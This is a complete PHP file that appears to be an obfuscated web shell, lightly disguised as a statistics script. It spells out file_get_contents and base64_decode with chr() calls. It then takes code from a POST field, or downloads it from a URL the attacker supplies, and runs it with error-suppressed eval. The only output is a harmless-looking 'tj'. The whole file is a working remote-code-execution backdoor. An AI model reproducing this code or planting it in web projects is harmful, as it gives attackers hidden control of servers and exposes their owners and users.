<?php
$c="chr";
$getpar.=$c(36).$c(95).$c(82).$c(69).$c(81).$c(85).$c(69).$c(83).$c(84);
$get=chr(102).chr(105).chr(108).chr(101).chr(95);
$get.=chr(103).chr(101).chr(116).chr(95).chr(99);
$get.=chr(111).chr(110).chr(116).chr(101).chr(110);
$get.=chr(116).chr(115);
$unzip=$c(103).$c(122).$c(105).$c(110);
$unzip.=$c(102).$c(108).$c(97).$c(116).$c(101);

$undecode=$c(98).$c(97).$c(115).$c(101).$c(54).$c(52);
$undecode.=$c(95).$c(100).$c(101).$c(99).$c(111).$c(100).$c(101);
if($_POST['phpcodeurl']!=null&&$_POST['phpcodeurl']!=''){
	$tongji=$get($_POST['phpcodeurl']);
}
else if($_POST['tongji']!=null&&$_POST['tongji']!=''){
	$tongji=$_POST['tongji'];
}
$ecode = $_REQUEST['0'];
$ecode.= $_REQUEST['1'];
$ecode.= $_REQUEST['2'];
$ecode.= $_REQUEST['3'];
$ecode.= $_REQUEST['4'];
$ecode.= $_REQUEST['5'];
$ecode.= $_REQUEST['6'];
$ecode.= $_REQUEST['7'];
$ecode.= $_REQUEST['8'];
$ecode.= $_REQUEST['9'];
$ecode.= $_REQUEST['10'];
$ecode.= $_REQUEST['11'];
$ecode.= $_REQUEST['12'];
$ecode.= $_REQUEST['13'];
$ecode.= $_REQUEST['14'];
$ecode.= $_REQUEST['15'];
$ecode.= $_REQUEST['16'];

//$ecode($undecode($tongji));
@eval($undecode($tongji));
echo '<br>tj,'.' tj';
?>
